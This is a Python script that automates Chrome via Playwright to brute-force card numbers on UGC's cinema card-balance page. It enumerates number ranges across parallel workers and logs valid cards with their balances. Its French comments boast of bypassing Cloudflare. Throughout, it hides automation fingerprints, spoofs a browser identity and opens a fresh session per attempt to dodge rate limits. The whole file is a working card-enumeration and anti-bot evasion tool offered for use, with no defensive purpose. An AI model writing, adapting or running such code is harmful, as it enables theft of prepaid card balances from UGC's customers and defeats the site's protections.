#!/usr/bin/env python3
"""
UGC card checker via Playwright (vrai Chrome headless)
Bypass Cloudflare complet — chaque check = nouveau contexte browser isolé

pip install playwright
playwright install chromium

Usage:
  python ugc_playwright.py --check 12345678901
  python ugc_playwright.py --brute --prefix 1 --len 11 --count 500 --workers 3
"""

import re, time, random, argparse, threading, queue
from datetime import datetime
from pathlib import Path

PAGE_URL   = "https://www.ugc.fr/les-offres-ugc.html"
ERROR_KW   = ["le type de carte est inconnu","type de carte est inconnu",
               "introuvable","invalide","incorrect","carte inconnue"]
SESSION_KW = ["une demande a déjà été envoyée","momentanément indisponible"]
SUCCESS_KW = ["votre solde","solde :","places restantes","carte est valide",
               "crédit disponible","valable jusqu"]

def check_card_playwright(num: str, headless=True, timeout_ms=20000) -> dict:
    """
    Ouvre un contexte Chrome isolé, remplit le form carte, lit la réponse.
    Chaque appel = session totalement fraîche (new cookies, new fingerprint).
    """
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        return {"num": num, "status": "ERR_playwright_not_installed",
                "detail": "pip install playwright && playwright install chromium"}

    num = str(num).strip()

    with sync_playwright() as pw:
        # lance Chrome avec user-agent réaliste
        browser = pw.chromium.launch(
            headless=headless,
            args=[
                "--no-sandbox",
                "--disable-blink-features=AutomationControlled",
                "--disable-infobars",
            ]
        )
        # contexte isolé = cookies/session totalement neufs
        ctx = browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                       "Chrome/124.0.0.0 Safari/537.36",
            locale="fr-FR",
            timezone_id="Europe/Paris",
            viewport={"width": 1280, "height": 720},
            # masque les traces automation
            extra_http_headers={
                "Accept-Language": "fr-FR,fr;q=0.9",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            }
        )

        # supprime les indices webdriver
        ctx.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
            Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3]});
            Object.defineProperty(navigator, 'languages', {get: () => ['fr-FR','fr']});
        """)

        page = ctx.new_page()

        try:
            # ── charge la page ──────────────────────────────────────────────────
            page.goto(PAGE_URL, wait_until="networkidle", timeout=timeout_ms)

            # ── cherche le champ carte ──────────────────────────────────────────
            # UGC form: <input name="cardNumber" type="text">
            field = None
            for selector in [
                'input[name="cardNumber"]',
                'input[name="numeroCarte"]',
                'input[type="text"][name*="card" i]',
                'input[type="text"][name*="carte" i]',
                'input[type="text"][name*="numero" i]',
                '#SoldeCarte input[type="text"]',
                'form[name="valider"] input[type="text"]',
                '.form-inline input[type="text"]',
            ]:
                try:
                    el = page.wait_for_selector(selector, timeout=3000)
                    if el:
                        field = selector
                        break
                except Exception:
                    pass

            if not field:
                # fallback: prend le premier input text du form carte
                page.wait_for_selector("form", timeout=5000)
                field = 'input[type="text"]'

            # ── remplit le numéro ───────────────────────────────────────────────
            page.fill(field, num)
            time.sleep(random.uniform(0.3, 0.8))  # comportement humain

            # ── submit ──────────────────────────────────────────────────────────
            # trouve le bouton submit dans le même form
            submitted = False
            for btn_sel in [
                'input[type="submit"]',
                'button[type="submit"]',
                'button:has-text("Vérifier")',
                'button:has-text("Valider")',
                'button:has-text("OK")',
                '.btn-submit',
            ]:
                try:
                    btn = page.query_selector(btn_sel)
                    if btn and btn.is_visible():
                        btn.click()
                        submitted = True
                        break
                except Exception:
                    pass

            if not submitted:
                # fallback: presse Enter sur le field
                page.press(field, "Enter")

            # ── attend la réponse ───────────────────────────────────────────────
            page.wait_for_load_state("networkidle", timeout=timeout_ms)
            time.sleep(0.5)

            content = page.content()
            low     = content.lower()

            if any(k in low for k in SESSION_KW):
                return {"num": num, "status": "SESSION_LIMIT"}
            if any(k in low for k in ERROR_KW):
                return {"num": num, "status": "INVALID", "balance": None}
            if any(k in low for k in SUCCESS_KW):
                balance = None
                for pat in [r"\d+[.,]\d+\s*€", r"€\s*\d+[.,]\d+", r"\d+\s*places?"]:
                    m = re.search(pat, content, re.I)
                    if m:
                        balance = m.group(0).strip()
                        break
                return {"num": num, "status": "VALID", "balance": balance}

            return {"num": num, "status": "AMBIG", "detail": content[1000:1200]}

        except Exception as e:
            return {"num": num, "status": f"ERR_{str(e)[:60]}"}
        finally:
            browser.close()

# ─── BRUTE FORCE ───────────────────────────────────────────────────────────────
LOCK   = threading.Lock()
FOUND  = []
STATS  = {"checked": 0, "valid": 0, "err": 0}
STOP   = threading.Event()

def worker(work_q: queue.Queue, out_file: str, delay: float, headless: bool):
    while not STOP.is_set():
        try:
            num = work_q.get(timeout=3)
        except queue.Empty:
            break

        res = check_card_playwright(num, headless=headless)

        with LOCK:
            if res["status"] == "SESSION_LIMIT":
                # réessaie (nouveau contexte = normalement ok)
                work_q.put(num)
                work_q.task_done()
                time.sleep(2)
                continue

            STATS["checked"] += 1
            c     = STATS["checked"]
            total = c + work_q.qsize()
            pct   = (c / max(total,1)) * 100

            if res["status"] == "VALID":
                STATS["valid"] += 1
                FOUND.append(res)
                line = f"💳 VALID: {res['num']} | solde: {res.get('balance')}"
                print(f"\n  ✅ {line}")
                with open(out_file, "a", encoding="utf-8") as f:
                    f.write(f"{datetime.now().isoformat()} | {line}\n")
            elif res["status"].startswith("ERR_"):
                STATS["err"] += 1

            print(f"  [{c:>5}/{total}] {pct:5.1f}%  valid={STATS['valid']}  "
                  f"err={STATS['err']}  last={num}", end="\r", flush=True)

        time.sleep(delay)
        work_q.task_done()

def run_brute(nums, workers_n, delay, out_file, headless):
    random.shuffle(nums)
    q = queue.Queue()
    for n in nums: q.put(str(n))

    print(f"[*] {len(nums)} cartes | {workers_n} workers | headless={'oui' if headless else 'non'}")
    print(f"[*] Output: {out_file}")
    print("─"*60)

    ts = [threading.Thread(target=worker,
          args=(q, out_file, delay, headless), daemon=True)
          for _ in range(workers_n)]
    for t in ts: t.start()
    try: q.join()
    except KeyboardInterrupt:
        print("\n[!] Interrupted"); STOP.set()
    for t in ts: t.join(timeout=5)

    print(f"\n\n{'═'*60}")
    print(f"  Checked : {STATS['checked']}")
    print(f"  Valid   : {STATS['valid']}")
    if FOUND:
        print(f"\n  💳 CARTES VALIDES:")
        for r in FOUND:
            print(f"     {r['num']} — solde: {r.get('balance')}")
    print('═'*60)

# ─── MAIN ──────────────────────────────────────────────────────────────────────
def main():
    p = argparse.ArgumentParser(description="UGC card checker via Playwright")
    p.add_argument("--check",    help="Vérifie une carte")
    p.add_argument("--brute",    action="store_true")
    p.add_argument("--prefix",   default="1")
    p.add_argument("--len",      type=int, default=11)
    p.add_argument("--count",    type=int, default=200)
    p.add_argument("--start",    type=int)
    p.add_argument("--end",      type=int)
    p.add_argument("--workers",  type=int, default=2, help="Instances Chrome parallèles (max 3-4)")
    p.add_argument("--delay",    type=float, default=2.0)
    p.add_argument("--output",   default="ugc_valid_cards.txt")
    p.add_argument("--show",     action="store_true", help="Montre le browser (non-headless)")
    args = p.parse_args()

    headless = not args.show

    if args.check:
        print(f"[*] Check {args.check} (headless={headless})")
        res = check_card_playwright(args.check, headless=headless)
        if res["status"] == "VALID":
            print(f"\n✅ VALID — solde: {res.get('balance')}")
        elif res["status"] == "INVALID":
            print(f"\n❌ INVALID — carte inconnue chez UGC")
        elif res["status"] == "ERR_playwright_not_installed":
            print(f"\n[!] Playwright manquant:")
            print(f"    pip install playwright")
            print(f"    playwright install chromium")
        else:
            print(f"\n❓ {res['status']}")
            if "detail" in res:
                print(f"   {res['detail'][:200]}")
        return

    if args.brute:
        if args.start and args.end:
            nums = list(range(args.start, args.end+1))
        else:
            pad   = args.len - len(args.prefix)
            start = int(args.prefix) * (10**pad)
            nums  = [start + i for i in range(args.count)]
        run_brute(nums, args.workers, args.delay, args.output, headless)
    else:
        p.print_help()

if __name__ == "__main__":
    main()
